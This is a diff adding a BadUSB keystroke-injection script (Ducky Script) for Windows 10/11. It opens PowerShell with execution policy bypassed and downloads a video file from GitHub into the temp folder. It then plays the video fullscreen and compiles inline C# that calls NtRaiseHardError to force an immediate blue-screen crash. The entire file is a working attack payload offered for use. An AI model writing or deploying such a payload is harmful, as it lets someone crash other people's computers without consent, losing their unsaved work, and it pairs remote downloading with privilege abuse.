@@ -1,0 +1,18 @@
+REM Title: Invoke BSOD
+REM Author: @beigeworm
+REM Description: This will open powershell and cause a blue screen.
+REM Target: Windows 10 / 11
+REM CREDIT: All credit to FalsePhilosipher for the code! https://github.com/FalsePhilosopher
+
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+REM open powershell
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -Exec Bypass
+ENTER
+DELAY 4000
+STRING $video = "$env:TMP/mario.wmv";iwr "https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Misc/Win/BSOD/mario-head/mario.wmv" -OutFile $video; & $video;sleep 1;$wshell = New-Object -ComObject wscript.shell;$wshell.SendKeys("{F11}");sleep 5;$source = 'using System; using System.Runtime.InteropServices; public static class CS{[DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);[DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response); public static unsafe void Kill(){Boolean tmp1;uint tmp2;RtlAdjustPrivilege(19, true, false, out tmp1);NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);}}';$comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters;$comparams.CompilerOptions = '/unsafe';$a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams;[CS]::Kill()
+ENTER
